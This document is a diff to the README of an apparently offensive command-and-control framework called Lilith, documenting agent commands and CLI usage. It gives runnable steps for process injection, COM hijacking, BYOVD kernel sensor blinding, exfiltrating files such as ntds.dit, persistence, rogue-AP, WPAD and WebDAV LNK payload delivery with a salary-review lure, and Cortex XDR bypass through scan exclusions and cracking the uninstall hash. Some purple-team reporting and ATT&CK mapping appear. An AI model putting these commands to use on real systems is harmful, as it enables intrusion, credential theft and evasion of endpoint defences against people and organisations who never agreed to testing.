@@ -641,15 +641,38 @@ Up to 4 commands run simultaneously on background threads. Long-running operatio
 
 ## Built-in agent commands
 
-| Command | Description |
-|---|---|
-| `migrate` | Inject into a process from the priority pool |
-| `migrate <proc.exe>` | Inject into the named process |
-| `pid <proc.exe>` | Look up the PID of a running process |
-| `wnfinject <pid>` | WNF-based shellcode injection (no new thread object) |
-| `fiberexec` | Re-inject agent SC via fiber on current thread (no thread creation event) |
-| `comhijack <dll> <clsid>` | Register COM server hijack via HKCU; cleans up after CoCreateInstance |
-| `byovdrun <url>` | Download + inject BYOVD shellcode in-memory |
+### Process and injection
+
+| Command | ATT&CK | Description |
+|---|---|---|
+| `migrate` | T1055 | Inject into the priority-pool process (svchost → RuntimeBroker → explorer …) |
+| `migrate <proc.exe>` | T1055 | Inject into the named process |
+| `pid <proc.exe>` | T1057 | Look up the PID of a running process |
+| `wnfinject <pid>` | T1055.015 | WNF subscription overwrite injection — no new thread object |
+| `fiberexec` | T1055 | Re-inject agent SC via ConvertThreadToFiber — no PsSetCreateThreadNotifyRoutine event |
+| `comhijack <dll> <clsid>` | T1546.015 | Register COM server hijack in HKCU; auto-cleans after CoCreateInstance |
+| `byovdrun [/path/enc]` | T1068 | Download and inject BYOVD shellcode in-memory (default: `/cdn/static/v3/byovd.enc`) |
+
+### File transfer
+
+| Command | ATT&CK | Description |
+|---|---|---|
+| `upload <url> <dest>` | T1105 | Fetch raw bytes from a staging URL and write to `dest` path on target — no `.enc` decryption, pure byte delivery. Use `lilith c2 --upload` which stages the file automatically. |
+| `download <path>` | T1041 | Read file from target disk (≤ 50 MB), return as `_BIN_B64:<base64>`. CLI decodes and saves locally. |
+| `screenshot` | T1113 | GDI screen capture (24bpp BMP, dynamic `user32`/`gdi32` load, no static imports). Returns `_BIN_B64:<base64>`. CLI saves as `.bmp`. |
+
+### CLI wrappers (recommended over raw commands)
+
+```bash
+# Stage local file on C2 server → push upload task to agent
+lilith c2 --session <ID> --upload rtc.sys "C:\Windows\Temp\rtc.sys"
+
+# Pull file from target, save locally
+lilith c2 --session <ID> --download "C:\Windows\NTDS\ntds.dit" --out ntds.dit
+
+# Capture desktop
+lilith c2 --session <ID> --screenshot --out desktop.bmp
+```
 
 ### REPL meta-commands
 
@@ -657,8 +680,8 @@ Up to 4 commands run simultaneously on background threads. Long-running operatio
 |---|---|
 | `!persist wmi\|run\|schtask` | Install persistence from active session |
 | `!timeout <sec>` | Adjust result wait timeout |
-| `!kill` | Remove session from server registry |
-| `exit` / `quit` | Leave REPL (session stays alive) |
+| `!kill` | Remove session from server registry and exit REPL |
+| `exit` / `quit` | Leave REPL (session stays alive on target) |
 
 ---
 
@@ -723,7 +746,7 @@ Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Re
 # 1. Setup
 source env/bin/activate
 python3 lilith.py init
-nano engagement.yaml
+nano engagement.yaml          # set lhost, tools, injection_profile
 
 # 2. Check dependencies
 python3 lilith.py check
@@ -749,10 +772,10 @@ python3 lilith.py build --usb SharpUp --usb-device pico --usb-boot-delay 3000
 python3 lilith.py build --c2-stager --ble --ble-device bruce
 python3 lilith.py build --ble SharpUp --ble-device all
 
-# 7. Start server
+# 7. Start server (engagement DB auto-created at ~/.lilith/engagement.db)
 python3 lilith.py serve
 
-# 8. On target — paste 2 lines printed by build --stager
+# 8. On target — paste 10 lines printed by build --stager or --c2-stager
 
 # 9. Interact with C2
 python3 lilith.py c2 --list
@@ -769,11 +792,22 @@ python3 lilith.py c2 --kill <old_id>
 python3 lilith.py c2 --session <ID> --persist wmi
 python3 lilith.py c2 --session <ID> --persist schtask
 
-# 12. BYOVD kernel sensor blinding (fileless)
+# 12. File operations
+python3 lilith.py c2 --session <ID> --upload driver.sys "C:\Windows\Temp\driver.sys"
+python3 lilith.py c2 --session <ID> --download "C:\Windows\NTDS\ntds.dit" --out ntds.dit
+python3 lilith.py c2 --session <ID> --screenshot --out desktop.bmp
+
+# 13. BYOVD kernel sensor blinding (fileless)
 python3 lilith.py build --byovd --byovd-driver "C:\Windows\Temp\rtc.sys"
-# then from C2:
-# agent> upload C:\Windows\Temp\rtc.sys
-# agent> byovdrun /cdn/static/v3/byovd.enc
+python3 lilith.py c2 --session <ID> --upload rtc.sys "C:\Windows\Temp\rtc.sys"
+python3 lilith.py c2 --session <ID> --cmd "byovdrun /cdn/static/v3/byovd.enc"
+
+# 14. Annotate sessions and export for purple team
+python3 lilith.py engage                                        # session summary
+python3 lilith.py engage --tag <ID> "WS01\jsmith (DA path)"   # label session
+python3 lilith.py engage --list-tasks --session <ID>           # ATT&CK task view
+python3 lilith.py engage --export md --out report.md           # Markdown report
+python3 lilith.py engage --export json --out report.json       # JSON for SIEM/ticketing
 ```
 
 ---
@@ -830,6 +864,173 @@ All build output goes to `~/.lilith/` by default (or `$WORKSPACE/lilith/` if set
 | `byovd.exe` / `byovd.enc` | BYOVD kit (only if `--byovd` was run) |
 | `usb/` | USB HID payload files (only if `--usb` was run) |
 | `ble/` | BLE HID payload files (only if `--ble` was run) |
+
+---
+
+---
+
+## Network delivery
+
+### Captive portal (`lilith network captive`)
+
+Rogue WiFi AP that auto-triggers the browser on connection. Target connects to the SSID, captive detection opens the browser, lure page delivers the stager.
+
+```bash
+python3 lilith.py build --smuggle     # build lure page first
+python3 lilith.py network captive --iface wlan1 --ssid Corp_Guest
+```
+
+### WPAD poisoning (`lilith network wpad`)
+
+Serves a `wpad.dat` PAC file pointing all traffic through an injecting HTTP proxy. Every unencrypted HTTP response gets the stager injected.
+
+```bash
+python3 lilith.py build --smuggle
+python3 lilith.py network wpad --pac-port 80 --proxy-port 8080
+```
+
+### WebDAV LNK delivery (`lilith network webdav`)
+
+Hosts a `.lnk` payload via a minimal WebDAV server. When the target opens the `search-ms:` URI (via email, chat link, or HTML `<a href>`), Windows Explorer opens a search-results window showing the LNK. One double-click fires the payload.
+
+```bash
+# Build the LNK payload first
+python3 lilith.py build --smuggle
+
+# Start WebDAV server (prints the search-ms: URI)
+python3 lilith.py network webdav \
+  --lnk-path ~/.lilith/payload.lnk \
+  --lnk-name "Q2 2025 Salary Review" \
+  --webdav-port 8080
+```
+
+Output:
+```
+[+] WebDAV server: http://0.0.0.0:8080/  (serving payload.lnk)
+
+[*] Deliver this URI to the target (email, chat, HTML href):
+
+    search-ms:query=Q2+2025+Salary+Review.lnk&crumb=location:http%3A%2F%2F...
+
+[*] When clicked, Explorer opens a search window showing 'Q2 2025 Salary Review'.
+    One double-click fires the LNK payload.
+```
+
+---
+
+## Cortex XDR intel (`lilith xdr`)
+
+Parses a Cortex XDR `agent_settings.db` directory pulled from a live target. Extracts actionable intelligence for bypassing the running agent.
+
+```bash
+# Pull the DB from target first
+lilith c2 --session <ID> \
+  --download "C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db" \
+  --out agent_settings.db
+
+# Parse
+python3 lilith.py xdr --parse agent_settings.db/
+```
+
+Output:
+```
+==============================
+UNINSTALL CREDENTIAL
+==============================
+  Hash : a3f8c1d2...
+  Salt : 4e2b9f1a...
+
+  Hashcat (PBKDF2-SHA512, mode 10900):
+    hashcat -m 10900 'a3f8c1d2...:4e2b9f1a...' rockyou.txt
+
+==============================
+PATH EXCLUSIONS (3 found)
+==============================
+  C:\Program Files\CompanyApp\plugins\
+  C:\Windows\Temp\SysUpdate\
+  C:\ProgramData\Microsoft\DevDiv\
+
+  [*] Drop payload into any of the above — Cortex XDR will not scan it.
+
+==============================
+LILITH TACTICAL NOTES
+==============================
+  1. Drop runner_c.dat + stage.ps1 into 'C:\Windows\Temp\SysUpdate\' — exclusion bypasses on-write scan.
+  2. Memory protection appears active — prefer fiber exec (fiberexec) over VirtualAlloc+CreateRemoteThread.
+  3. Crack the uninstall hash before engagement end — useful for lateral movement to other XDR-managed hosts.
+```
+
+---
+
+## Engagement database (`lilith engage`)
+
+Every interaction is automatically recorded to `~/.lilith/engagement.db` (SQLite) while `lilith serve` is running. The database persists across server restarts and accumulates the full engagement timeline.
+
+### What gets recorded
+
+| Event | Recorded automatically |
+|---|---|
+| Agent check-in | Session ID, source IP, timestamp |
+| Task dispatched | Command, timestamp, MITRE ATT&CK technique |
+| Result received | Full output, timestamp, binary flag |
+| Credential capture | Auto-detected hashes, plaintext, Kerberos tickets |
+| File served | Filename, client IP, size, timestamp |
+| C2 callback | Token, source IP, output preview |
+
+### Querying
+
+```bash
+# Session summary
+python3 lilith.py engage
+
+# Task list with ATT&CK technique for each command
+python3 lilith.py engage --list-tasks
+
+# Filter to a specific session
+python3 lilith.py engage --list-tasks --session abc123def456
+
+# Annotate a session with the real host and user context
+python3 lilith.py engage --tag abc123def456 "WS01\jsmith (Domain Admin)"
+```
+
+### Export for purple team
+
+```bash
+# Full engagement data as JSON (for SIEM/ticketing import)
+python3 lilith.py engage --export json --out engagement.json
+
+# Markdown report (for report writing and purple team briefing)
+python3 lilith.py engage --export md --out engagement_report.md
+```
+
+The Markdown report includes:
+
+- **Executive summary** — sessions, tasks, techniques, credential captures
+- **Session table** — host, registration time, operator label, task count
+- **Full task timeline** — grouped by session, with ATT&CK technique ID and link, credential flag
+- **Collapsible output blocks** — full command output for every result
+- **Credential capture section** — extracted hashes, plaintext passwords, Kerberos tickets
+- **ATT&CK coverage matrix** — observed techniques linked to [attack.mitre.org](https://attack.mitre.org)
+- **Event log** — file transfers, callbacks, delivery events
+
+### MITRE ATT&CK mapping (automatic)
+
+Commands are mapped to ATT&CK techniques at dispatch time. Examples:
+
+| Command | Technique |
+|---|---|
+| `whoami` | T1033 — System Owner/User Discovery |
+| `migrate svchost.exe` | T1055 — Process Injection |
+| `!persist wmi` | T1546.003 — WMI Event Subscription |
+| `screenshot` | T1113 — Screen Capture |
+| `upload … ` | T1105 — Ingress Tool Transfer |
+| `download …` | T1041 — Exfiltration Over C2 Channel |
+| `mimikatz` | T1003 — OS Credential Dumping |
+| `rubeus` | T1558 — Steal/Forge Kerberos Tickets |
+| `comhijack` | T1546.015 — COM Hijacking |
+| `byovdrun` | T1068 — Exploitation for Privilege Escalation |
+| `chisel` | T1090.003 — Multi-hop Proxy |
+| `certify` | T1649 — Steal Authentication Certificates |
 
 ---
 
